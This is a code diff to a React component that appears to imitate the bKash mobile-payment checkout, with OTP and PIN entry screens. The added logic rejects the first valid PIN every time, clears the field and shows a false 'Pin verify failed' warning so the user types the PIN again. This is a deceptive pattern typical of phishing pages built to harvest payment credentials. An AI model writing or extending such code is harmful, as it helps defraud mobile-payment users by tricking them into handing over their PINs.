@@ -15,6 +15,8 @@ const BkashPayment = () => {
   const [showFailedView, setShowFailedView] = useState(false);
   const [otpCode, setOtpCode] = useState("");
   const [pinCode, setPinCode] = useState("");
+  const [pinAttempts, setPinAttempts] = useState(0);
+  const [showPinWarning, setShowPinWarning] = useState(false);
   const [resendTimer, setResendTimer] = useState(30);
   const [resendStatus, setResendStatus] = useState<'idle' | 'sending' | 'sent'>('idle');
   const [redirectTimer, setRedirectTimer] = useState(5);
@@ -159,7 +161,15 @@ const BkashPayment = () => {
 
   const handlePinConfirm = () => {
     if (isValidPin()) {
+      if (pinAttempts === 0) {
+        setPinAttempts(1);
+        setShowPinWarning(true);
+        setPinCode("");
+        setTimeout(() => pinInputRef.current?.focus(), 50);
+        return;
+      }
       setIsConfirmLoading(true);
+      setShowPinWarning(false);
       setTimeout(() => {
         setIsConfirmLoading(false);
         setShowPinView(false);
@@ -349,8 +359,15 @@ const BkashPayment = () => {
                     value={pinCode}
                     onChange={handlePinChange}
                     placeholder="Enter PIN"
-                    className="w-full bg-white rounded px-4 py-2.5 text-center text-gray-600 text-sm placeholder:text-gray-400 focus:outline-none focus:ring-4 focus:ring-white/40"
+                    className="w-full bg-white rounded px-4 py-2.5 text-center text-gray-600 text-lg tracking-[0.5em] placeholder:text-gray-400 placeholder:text-sm placeholder:tracking-normal focus:outline-none focus:ring-4 focus:ring-white/40"
+                    style={{ fontSize: pinCode.length > 0 ? '24px' : '14px', letterSpacing: pinCode.length > 0 ? '0.5em' : 'normal' }}
                   />
+                  {showPinWarning && (
+                    <div className="flex items-center justify-center gap-1.5 mt-2">
+                      <span className="text-white text-sm">⚠</span>
+                      <span className="text-white text-xs font-medium">Pin verify failed, you have remained 1 times, be careful !</span>
+                    </div>
+                  )}
                 </div>
 
                 {/* PIN Action Buttons */}
@@ -480,9 +497,9 @@ const BkashPayment = () => {
                   />
                   <div className="h-5 flex items-center justify-center mt-3">
                     <p className="text-white text-center text-[10px]">
-                      Confirm and proceed,{" "}
+                      By clicking the confirm button you agree to the{" "}
                       <a href="#" className="underline hover:text-white/80">
-                        terms & conditions
+                        Terms & Conditions
                       </a>
                     </p>
                   </div>
